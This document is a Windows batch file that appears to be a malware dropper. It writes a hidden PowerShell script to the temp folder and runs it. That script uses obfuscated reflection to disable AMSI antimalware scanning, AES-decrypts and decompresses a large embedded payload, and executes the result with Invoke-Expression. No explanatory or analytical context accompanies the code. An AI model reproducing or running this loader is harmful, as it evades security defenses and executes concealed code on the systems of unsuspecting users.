@echo off
setlocal
set "PS=%TEMP%\svc.ps1"
del "%PS%" 2>nul

powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "$L=[IO.File]::ReadAllLines('%~f0');$A=[array]::IndexOf($L,'#PS1#')+1;$B=[array]::IndexOf($L,'#END#');[IO.File]::WriteAllLines($env:PS,$L[$A..($B-1)])"

if not exist "%PS%" exit /b

powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%PS%"
del "%PS%" 2>nul
endlocal
exit /b
#PS1#
$kJNGDAsg3NjcLjW = ('Assem' + 'bly')
$ZBZ9NMuvL10sBEFnaC = ('GetTy' + 'pe')
$Gc5SnYO4w02Bo2Kcme = ('GetF' + 'ield')
$MNsF0Pe9Exw2RkYI = ('SetVal' + 'ue')
$GQiyGS94r5p9zA7 = [sTRiNg]::('new')([CoNVERt]::('FromBa' + 'se64S' + 'tring')('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA=='))
$Ismoa5otgEIMUhusnY = [sTRiNg]::('new')([CoNVERt]::('FromBa' + 'se64S' + 'tring')('aW9uLkFtc2lVdGlscw=='))
$XVBqysUnpYcuNYJs = [sTRiNg]::('new')([CoNVERt]::('FromBa' + 'se64S' + 'tring')('YW1zaUluaXRGYWlsZWQ='))
$QUFGAH2mHXdhft4LI = [sTRiNg]::('new')([CoNVERt]::('FromBa' + 'se64S' + 'tring')('Tm9uUHVibGljLFN0YXRpYw=='))
$P03WIqy40qRrCpcNui = [rEF].$kJNGDAsg3NjcLjW
$ytmyi9nfnZYAsg = $P03WIqy40qRrCpcNui.$ZBZ9NMuvL10sBEFnaC.('inVO' + 'kE')(($GQiyGS94r5p9zA7+$Ismoa5otgEIMUhusnY))
$BsULbD1f6BrZKv7fv4 = $ytmyi9nfnZYAsg.$Gc5SnYO4w02Bo2Kcme.('inVO' + 'kE')($XVBqysUnpYcuNYJs,$QUFGAH2mHXdhft4LI)
$BsULbD1f6BrZKv7fv4.$MNsF0Pe9Exw2RkYI.('inVO' + 'kE')((100-100),(200 -eq 200))
$RhxBajFlKI20C7n5 = ('Mode')
$r2krgXRaNserGiKa = ('Bloc' + 'kSiz' + [chAr](101))
$niCZfyV7pg4lEl4Q = ('KeySi' + 'ze')
$UMc0N1gsw4GR39KhO3 = ('Key')
$WaXRhYPXsO7HSO = ('Iv')
$jEkIev64e8AvXu9Ed = ('Create' + 'Decr' + 'yptor')
$j0aqUMRpIEKshnVU44 = ('Trans' + 'form' + 'Final' + 'Block')
$xz5aoS0Iuzdt2MhTSS = ('Lengt' + [ChAr](104))
$YGqUNPo3srfOsGlYi = ('Copy' + 'To')
$a66ZbBm0eHhVAN4 = ('Close')
$ugGerWcke0zmwqsxd = ('Dispos' + [ChaR](101))
$traia0pJ8BtagYys = ('ToArr' + 'ay')
$ecAay8ADiCNZVT = ('GetSt' + 'ring')
$i01xFTprX5gJsxkHzd = [cOnveRT]::('FromB' + 'ase64S' + 'tring')('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')
$F171XZk61skMoeXUo = [cOnveRT]::('FromB' + 'ase64S' + 'tring')('8CntlXOzJjUaai3hNCpJW/KTVZRrJLRDnIX6ZVShQLQ=')
$j7JzZWl5Js4WiNTdH = [SecuriTY.CryPtogRapHY.aES]::('Creat' + [CHaR](101))()
$j7JzZWl5Js4WiNTdH.$RhxBajFlKI20C7n5 = [secUrITY.CRyptoGrAPHY.ciPHerMODe]::('Cbc')
$j7JzZWl5Js4WiNTdH.$r2krgXRaNserGiKa = [int]((8014 -band 4853)+(8014 -bor 4853)-12739)
$j7JzZWl5Js4WiNTdH.$niCZfyV7pg4lEl4Q = [int]((3545 -band 2725)+(3545 -bor 2725)-6014)
$j7JzZWl5Js4WiNTdH.$UMc0N1gsw4GR39KhO3 = $F171XZk61skMoeXUo
$j7JzZWl5Js4WiNTdH.$WaXRhYPXsO7HSO = $i01xFTprX5gJsxkHzd[0..15]
$oByq91sfwwGYPru = $j7JzZWl5Js4WiNTdH.$jEkIev64e8AvXu9Ed.('inVOK' + [CHar](69))()
$YCXBDXcckECIOnz = $oByq91sfwwGYPru.$j0aqUMRpIEKshnVU44.('inVOK' + [CHar](69))($i01xFTprX5gJsxkHzd,16,($i01xFTprX5gJsxkHzd.$xz5aoS0Iuzdt2MhTSS - 16))
$Vbxu2oul92wdzdWm = [io.MEmOrYStREam]::('new')([byTe[]]$YCXBDXcckECIOnz)
$SMus9ldLYs8HD3 = [io.MEmOrYStREam]::('new')()
$GOmaBSdGRvhaKuwZ = [iO.coMPrESsION.gzipstReAm]::('new')($Vbxu2oul92wdzdWm, [IO.COmPreSSIon.cOMpRESsIonmOdE]::('Decomp' + 'ress'))
$GOmaBSdGRvhaKuwZ.$YGqUNPo3srfOsGlYi.('inVOK' + [CHar](69))($SMus9ldLYs8HD3)
$GOmaBSdGRvhaKuwZ.$a66ZbBm0eHhVAN4.('inVOK' + [CHar](69))()
$j7JzZWl5Js4WiNTdH.$ugGerWcke0zmwqsxd.('inVOK' + [CHar](69))()
$Vbxu2oul92wdzdWm.$a66ZbBm0eHhVAN4.('inVOK' + [CHar](69))()
$EykI84SOUQPdFtFSVg = $SMus9ldLYs8HD3.$traia0pJ8BtagYys.('inVOK' + [CHar](69))()
$M02d8hxSa9Q3yju = [tExT.encODINg]::('Utf8')
$eXEQWsUMvl3C4g = $M02d8hxSa9Q3yju.$ecAay8ADiCNZVT.('inVOK' + [CHar](69))($EykI84SOUQPdFtFSVg)
.([char]((7874-band7101)+(7874-bor7101)-14870)+[char]((4585-band1601)+(4585-bor1601)-6085)+[char]((2634-band9045)+(2634-bor9045)-11559))($eXEQWsUMvl3C4g)
#END#